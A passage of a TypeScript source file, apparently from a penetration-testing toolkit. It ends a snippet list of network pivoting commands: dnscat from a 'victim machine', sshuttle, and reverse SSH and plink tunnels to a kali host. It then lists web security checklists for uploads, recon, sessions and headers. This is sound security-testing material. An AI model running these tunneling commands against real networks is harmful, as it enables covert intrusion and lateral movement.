          { label: 'Connect from victim machine', value: 'dnscat feline.corp' },
        ],
      },
      {
        label: 'Sshuttle',
        snippets: [{ label: 'VPN-like tunnel between networks', value: 'sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24' }],
      },
      {
        label: 'Windows tunneling tools',
        snippets: [
          { label: 'ssh.exe dynamic reverse tunnel', value: 'ssh -N -R 9998 kali@192.168.45.171' },
          { label: 'Plink SSH tunnel', value: 'C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4' },
          { label: 'Netsh port proxy', value: 'netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215' },
        ],
      },
    ],
  },
];

export interface ChecklistItem {
  id: string;
  label: string;
  why: string;
  jumpTo?: { pillar: PillarId; moduleId: string };
}

export interface ChecklistGroup {
  id: string;
  name: string;
  items: ChecklistItem[];
}

export const CHECKLISTS: ChecklistGroup[] = [
  {
    id: 'upload',
    name: 'Upload testing',
    items: [
      {
        id: 'upload-max-size',
        label: 'Max file size enforced?',
        why: 'Test with ONE oversized-but-valid file - never flood the server with many large uploads.',
        jumpTo: { pillar: 'utility', moduleId: 'uploadtest' },
      },
      { id: 'upload-mime-server', label: 'MIME type validated server-side (not just client-side)?', why: 'Client-side checks are trivially bypassed by editing the request.' },
      {
        id: 'upload-magic-bytes',
        label: 'Magic-byte / content check performed?',
        why: 'A renamed file with a spoofed extension should still be rejected if the actual content does not match.',
        jumpTo: { pillar: 'utility', moduleId: 'uploadtest' },
      },
      {
        id: 'upload-double-ext',
        label: 'Double-extension blocked (e.g. x.php.jpg)?',
        why: 'Some servers only check the last extension, or misconfigured handlers execute the first.',
        jumpTo: { pillar: 'utility', moduleId: 'uploadtest' },
      },
      {
        id: 'upload-svg-sanitized',
        label: 'SVG sanitized (SVG-XSS)?',
        why: 'SVGs can embed <script> and fire XSS when rendered inline or opened directly.',
        jumpTo: { pillar: 'utility', moduleId: 'uploadtest' },
      },
      {
        id: 'upload-exif-stripped',
        label: 'EXIF stripped on stored images?',
        why: 'Uploaded photos can leak GPS coordinates and device info if metadata is preserved.',
        jumpTo: { pillar: 'osint', moduleId: 'exifpeek' },
      },
      {
        id: 'upload-separate-domain',
        label: 'Files served from a separate, non-executable domain?',
        why: 'Prevents an uploaded file from ever being executed in the app\'s own origin/context.',
      },
      {
        id: 'upload-path-traversal',
        label: 'Path traversal in filename handled?',
        why: 'A filename like ../../evil.php should not escape the intended storage directory.',
      },
    ],
  },
  {
    id: 'recon',
    name: 'Recon',
    items: [
      { id: 'recon-subdomains', label: 'Subdomains enumerated', why: 'Widens the attack surface beyond the primary host.', jumpTo: { pillar: 'osint', moduleId: 'subfinder' } },
      { id: 'recon-robots', label: 'robots.txt checked', why: 'Often reveals paths the owner wants hidden from search engines.', jumpTo: { pillar: 'utility', moduleId: 'autofinder' } },
      { id: 'recon-sitemap', label: 'sitemap.xml checked', why: 'Can reveal the full site structure at once.', jumpTo: { pillar: 'utility', moduleId: 'autofinder' } },
      { id: 'recon-wayback', label: 'Wayback Machine checked for old/removed endpoints', why: 'Historical snapshots can expose endpoints no longer linked but still live.' },
      { id: 'recon-buckets', label: 'Cloud storage buckets checked', why: 'Misconfigured S3/GCS/Azure buckets are a common source of data exposure.', jumpTo: { pillar: 'osint', moduleId: 'bucketspot' } },
      { id: 'recon-favicon', label: 'Favicon hash checked against known frameworks', why: 'Can fingerprint the underlying admin panel or framework.' },
      { id: 'recon-git', label: '.git directory exposure checked', why: 'An exposed .git folder can leak full source history.' },
    ],
  },
  {
    id: 'auth',
    name: 'Auth / session',
    items: [
      { id: 'auth-cookie-flags', label: 'Cookie flags checked (Secure/HttpOnly/SameSite)', why: 'Missing flags increase exposure to XSS/CSRF and network sniffing.', jumpTo: { pillar: 'tab-inspector', moduleId: 'cookiejar' } },
      { id: 'auth-jwt', label: 'JWT algorithm/claims inspected', why: 'Weak algorithms (none/HS256 confusion) or missing expiry are common issues.', jumpTo: { pillar: 'encode-payload', moduleId: 'encoderkit' } },
      { id: 'auth-fixation', label: 'Session fixation tested', why: 'Session ID should rotate on privilege change (e.g. login).' },
      { id: 'auth-logout', label: 'Logout actually invalidates the session server-side', why: 'A client-only logout leaves the session token valid if replayed.' },
      { id: 'auth-rate-limit', label: 'Login/reset rate-limiting present', why: 'Missing rate limits enable credential stuffing and brute force.' },
    ],
  },
  {
    id: 'headers',
    name: 'Headers',
    items: [
      { id: 'headers-csp', label: 'Content-Security-Policy present and meaningful', why: 'Mitigates XSS impact by restricting script/resource sources.', jumpTo: { pillar: 'tab-inspector', moduleId: 'headergrade' } },
      { id: 'headers-hsts', label: 'Strict-Transport-Security present', why: 'Prevents protocol downgrade attacks.', jumpTo: { pillar: 'tab-inspector', moduleId: 'headergrade' } },
      { id: 'headers-xfo', label: 'X-Frame-Options / frame-ancestors present', why: 'Prevents clickjacking via iframe embedding.', jumpTo: { pillar: 'tab-inspector', moduleId: 'headergrade' } },
      { id: 'headers-nosniff', label: 'X-Content-Type-Options: nosniff present', why: 'Stops browsers from MIME-sniffing responses into executable types.', jumpTo: { pillar: 'tab-inspector', moduleId: 'headergrade' } },
      { id: 'headers-referrer', label: 'Referrer-Policy present', why: 'Controls how much of the URL leaks to third parties on navigation.', jumpTo: { pillar: 'tab-inspector', moduleId: 'headergrade' } },
      { id: 'headers-permissions', label: 'Permissions-Policy present', why: 'Restricts access to sensitive browser features (camera, geolocation, etc).', jumpTo: { pillar: 'tab-inspector', moduleId: 'headergrade' } },
    ],
  },
];
